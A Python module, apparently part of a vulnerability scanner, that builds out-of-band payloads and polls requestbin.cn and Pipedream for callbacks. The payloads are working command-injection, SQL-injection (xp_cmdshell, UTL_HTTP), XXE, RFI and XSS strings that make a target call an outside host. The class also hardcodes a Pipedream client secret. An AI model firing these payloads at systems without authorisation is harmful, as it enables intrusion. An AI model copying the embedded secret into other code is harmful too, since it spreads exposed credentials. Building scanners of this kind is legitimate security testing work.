"""
Out-of-Band (OOB) Detection Utility

Provides callback-based detection for blind vulnerabilities:
- Generates unique callback URLs for each test
- Checks callback service for received requests
- Supports requestbin.cn and pipedream
"""

import time
import uuid
import requests
from typing import Dict, List, Tuple, Optional
from core.logger import get_logger

logger = get_logger(__name__)


class OOBDetector:
    """Out-of-Band vulnerability detector using callback services"""

    # Default callback configuration
    DEFAULT_REQUESTBIN_URL = "http://requestbin.cn/15y70i81"
    DEFAULT_PIPEDREAM_CLIENT_ID = "j1XIbDfgEA8ihGUfQ5xALdY9fVSFQdaNP1HGMAUnnSc"
    DEFAULT_PIPEDREAM_CLIENT_SECRET = "P4V40oQRWBFeKPSC8HIuJUn45KHnu784wzlmeaeXy8s"
    DEFAULT_PIPEDREAM_WEBHOOK = "https://eo8l8qkj6l1mfjp.m.pipedream.net"  # Pipedream webhook URL

    def __init__(self, callback_url: Optional[str] = None,
                 pipedream_client_id: Optional[str] = None,
                 pipedream_client_secret: Optional[str] = None,
                 pipedream_webhook: Optional[str] = None):
        """
        Initialize OOB detector

        Args:
            callback_url: Base callback URL (requestbin.cn)
            pipedream_client_id: Pipedream client ID
            pipedream_client_secret: Pipedream client secret
            pipedream_webhook: Pipedream webhook URL
        """
        self.callback_url = callback_url or self.DEFAULT_REQUESTBIN_URL
        self.pipedream_client_id = pipedream_client_id or self.DEFAULT_PIPEDREAM_CLIENT_ID
        self.pipedream_client_secret = pipedream_client_secret or self.DEFAULT_PIPEDREAM_CLIENT_SECRET
        self.pipedream_webhook = pipedream_webhook or self.DEFAULT_PIPEDREAM_WEBHOOK

        # Parse requestbin callback URL
        self.callback_base = self.callback_url.replace('http://', '').replace('https://', '').split('/')[0]
        self.callback_path = '/' + '/'.join(self.callback_url.replace('http://', '').replace('https://', '').split('/')[1:])

        # Parse pipedream webhook URL
        self.pipedream_base = self.pipedream_webhook.replace('http://', '').replace('https://', '')

        # Track sent payloads
        self.sent_payloads: Dict[str, Dict] = {}

    def generate_callback_id(self, vuln_type: str) -> str:
        """
        Generate unique callback ID

        Args:
            vuln_type: Type of vulnerability (ssrf, rce, sqli, xss, xxe, rfi)

        Returns:
            Unique callback ID
        """
        unique_id = str(uuid.uuid4())[:8]
        callback_id = f"{vuln_type}_{unique_id}"
        return callback_id

    def get_callback_payloads(self, vuln_type: str, target_url: str, param: str) -> List[Dict[str, str]]:
        """
        Generate OOB payloads for specific vulnerability type

        Generates payloads for BOTH Requestbin.cn and Pipedream for redundancy

        Args:
            vuln_type: Type of vulnerability (ssrf, rce, sqli, xss, xxe, rfi, cmdi)
            target_url: Target URL being tested
            param: Parameter being tested

        Returns:
            List of payload dictionaries with callback URLs
        """
        callback_id = self.generate_callback_id(vuln_type)
        requestbin_path = f"{self.callback_path}/{callback_id}"
        pipedream_path = f"/{callback_id}"

        # Store payload metadata for verification
        self.sent_payloads[callback_id] = {
            'vuln_type': vuln_type,
            'target_url': target_url,
            'param': param,
            'timestamp': time.time()
        }

        payloads = []

        if vuln_type == 'ssrf':
            # Requestbin payloads
            payloads.extend([
                {'payload': f"http://{self.callback_base}{requestbin_path}", 'type': 'http-requestbin', 'service': 'requestbin'},
                {'payload': f"https://{self.callback_base}{requestbin_path}", 'type': 'https-requestbin', 'service': 'requestbin'},
            ])
            # Pipedream payloads
            payloads.extend([
                {'payload': f"https://{self.pipedream_base}{pipedream_path}", 'type': 'https-pipedream', 'service': 'pipedream'},
                {'payload': f"//{self.pipedream_base}{pipedream_path}", 'type': 'protocol-relative-pipedream', 'service': 'pipedream'},
            ])

        elif vuln_type in ['rce', 'cmdi']:
            # Requestbin payloads
            payloads.extend([
                {'payload': f"curl http://{self.callback_base}{requestbin_path}", 'type': 'curl-requestbin', 'service': 'requestbin'},
                {'payload': f"wget http://{self.callback_base}{requestbin_path}", 'type': 'wget-requestbin', 'service': 'requestbin'},
            ])
            # Pipedream payloads
            payloads.extend([
                {'payload': f"curl https://{self.pipedream_base}{pipedream_path}", 'type': 'curl-pipedream', 'service': 'pipedream'},
                {'payload': f"wget https://{self.pipedream_base}{pipedream_path}", 'type': 'wget-pipedream', 'service': 'pipedream'},
                {'payload': f"ping -c 1 {self.callback_base}", 'type': 'ping', 'service': 'requestbin'},
                {'payload': f"nslookup {self.callback_base}", 'type': 'nslookup', 'service': 'requestbin'},
                {'payload': "`curl http://" + f"{self.callback_base}{requestbin_path}" + "`", 'type': 'backtick', 'service': 'requestbin'},
                {'payload': "$(curl http://" + f"{self.callback_base}{requestbin_path}" + ")", 'type': 'command-substitution', 'service': 'requestbin'},
                {'payload': f";curl http://{self.callback_base}{requestbin_path};", 'type': 'semicolon', 'service': 'requestbin'},
                {'payload': f"|curl http://{self.callback_base}{requestbin_path}|", 'type': 'pipe', 'service': 'requestbin'},
                {'payload': f"&curl http://{self.callback_base}{requestbin_path}&", 'type': 'ampersand', 'service': 'requestbin'},
            ])

        elif vuln_type == 'sqli':
            # Requestbin payloads
            payloads.extend([
                {'payload': f"'; EXEC master..xp_dirtree '\\\\{self.callback_base}{requestbin_path}' --", 'type': 'mssql-xp_dirtree', 'service': 'requestbin'},
                {'payload': f"' AND 1=UTL_HTTP.REQUEST('http://{self.callback_base}{requestbin_path}') --", 'type': 'oracle-utl_http', 'service': 'requestbin'},
            ])
            # Pipedream payloads
            payloads.extend([
                {'payload': f"' UNION SELECT LOAD_FILE('\\\\\\\\{self.pipedream_base}{pipedream_path}') --", 'type': 'mysql-load_file', 'service': 'pipedream'},
                {'payload': f"' OR 1=1; EXEC xp_cmdshell 'curl https://{self.pipedream_base}{pipedream_path}' --", 'type': 'mssql-xp_cmdshell', 'service': 'pipedream'},
            ])

        elif vuln_type == 'xxe':
            # Requestbin payloads
            payloads.extend([
                {'payload': f"<?xml version=\"1.0\"?><!DOCTYPE root [<!ENTITY test SYSTEM 'http://{self.callback_base}{requestbin_path}'>]><root>&test;</root>", 'type': 'xxe-entity', 'service': 'requestbin'},
            ])
            # Pipedream payloads
            payloads.extend([
                {'payload': f"<?xml version=\"1.0\"?><!DOCTYPE root [<!ENTITY % xxe SYSTEM \"https://{self.pipedream_base}{pipedream_path}\"> %xxe;]>", 'type': 'xxe-parameter', 'service': 'pipedream'},
                {'payload': f"<!DOCTYPE foo [<!ENTITY xxe SYSTEM \"https://{self.pipedream_base}{pipedream_path}\">]><foo>&xxe;</foo>", 'type': 'xxe-simple', 'service': 'pipedream'},
            ])

        elif vuln_type == 'rfi':
            # Requestbin payloads
            payloads.extend([
                {'payload': f"http://{self.callback_base}{requestbin_path}.php", 'type': 'php-requestbin', 'service': 'requestbin'},
            ])
            # Pipedream payloads
            payloads.extend([
                {'payload': f"https://{self.pipedream_base}{pipedream_path}.txt", 'type': 'txt-pipedream', 'service': 'pipedream'},
                {'payload': f"//{self.pipedream_base}{pipedream_path}.php", 'type': 'protocol-relative-pipedream', 'service': 'pipedream'},
            ])

        elif vuln_type == 'xss':
            # Requestbin payloads
            payloads.extend([
                {'payload': f"<script src=\"http://{self.callback_base}{requestbin_path}.js\"></script>", 'type': 'script-src-requestbin', 'service': 'requestbin'},
                {'payload': f"<img src=\"http://{self.callback_base}{requestbin_path}.gif\">", 'type': 'img-src-requestbin', 'service': 'requestbin'},
            ])
            # Pipedream payloads
            payloads.extend([
                {'payload': f"<iframe src=\"https://{self.pipedream_base}{pipedream_path}\"></iframe>", 'type': 'iframe-pipedream', 'service': 'pipedream'},
                {'payload': f"<svg onload=\"fetch('https://{self.pipedream_base}{pipedream_path}')\">", 'type': 'svg-onload-pipedream', 'service': 'pipedream'},
                {'payload': f"\"><script>fetch('https://{self.pipedream_base}{pipedream_path}')</script>", 'type': 'script-fetch-pipedream', 'service': 'pipedream'},
            ])

        # Add callback_id to all payloads
        for p in payloads:
            p['callback_id'] = callback_id

        return payloads

    def check_callback(self, callback_id: str, wait_time: int = 3) -> Tuple[bool, Optional[str]]:
        """
        Check if callback was received on BOTH Requestbin.cn and Pipedream

        Args:
            callback_id: Unique callback ID to check
            wait_time: Time to wait before checking (seconds)

        Returns:
            Tuple of (detected, evidence)
        """
        # Wait for callback to arrive
        time.sleep(wait_time)

        detected = False
        evidence_parts = []

        # CHECK 1: Requestbin.cn
        try:
            check_url = f"{self.callback_url}?inspect"
            response = requests.get(check_url, timeout=30)

            if response.status_code == 200:
                response_text = response.text.lower()

                # Check if our callback_id appears in the response
                if callback_id.lower() in response_text:
                    logger.info(f"✓ OOB callback received on Requestbin.cn: {callback_id}")
                    detected = True

                    # Extract evidence
                    evidence = self._extract_callback_evidence(response_text, callback_id)
                    evidence_parts.append(f"[Requestbin.cn] {evidence}")

        except Exception as e:
            logger.debug(f"Error checking Requestbin.cn: {e}")

        # CHECK 2: Pipedream (check event logs) - OPTIONAL, prioritize Requestbin.cn
        # Skip Pipedream check if Requestbin.cn already detected the callback
        if not detected:
            try:
                # Pipedream source API endpoint (uses OAuth client credentials)
                # Note: This requires setting up Pipedream source API
                # For now, we'll try a simple GET to the webhook to see if it logs
                pipedream_check_url = f"{self.pipedream_webhook}?check={callback_id}"

                # Try checking with a shorter timeout since Pipedream is unreliable
                response = requests.get(pipedream_check_url, timeout=5)

                # Pipedream might return callback data in response
                if response.status_code == 200 and callback_id.lower() in response.text.lower():
                    logger.info(f"✓ OOB callback received on Pipedream: {callback_id}")
                    detected = True
                    evidence_parts.append(f"[Pipedream] Callback ID '{callback_id}' detected")

            except Exception:
                # Silently skip Pipedream if it fails - we prioritize Requestbin.cn
                pass

        if detected:
            # Add proof URLs for manual verification
            proof_urls = []
            proof_urls.append(f"Requestbin Proof: {self.callback_url}?inspect (search for: {callback_id})")
            proof_urls.append(f"Pipedream Proof: {self.pipedream_webhook} (search for: {callback_id})")

            final_evidence = " | ".join(evidence_parts)
            final_evidence += "\n\nVerification URLs:\n" + "\n".join(proof_urls)
            return True, final_evidence

        return False, None

    def _extract_callback_evidence(self, response_text: str, callback_id: str) -> str:
        """
        Extract callback evidence from response

        Args:
            response_text: Response text from callback service
            callback_id: Callback ID

        Returns:
            Evidence string
        """
        # Look for the callback_id in context
        response_lower = response_text.lower()
        callback_lower = callback_id.lower()

        idx = response_lower.find(callback_lower)
        if idx == -1:
            return f"Callback ID '{callback_id}' found in response"

        # Extract 100 chars before and 50 after
        start = max(0, idx - 100)
        end = min(len(response_text), idx + len(callback_id) + 50)

        context = response_text[start:end]

        # Clean up HTML tags if present
        import re
        context = re.sub(r'<[^>]+>', ' ', context)
        context = re.sub(r'\s+', ' ', context).strip()

        return f"Callback received: ...{context}..."

    def get_payload_metadata(self, callback_id: str) -> Optional[Dict]:
        """
        Get metadata for a sent payload

        Args:
            callback_id: Callback ID

        Returns:
            Payload metadata dictionary
        """
        return self.sent_payloads.get(callback_id)
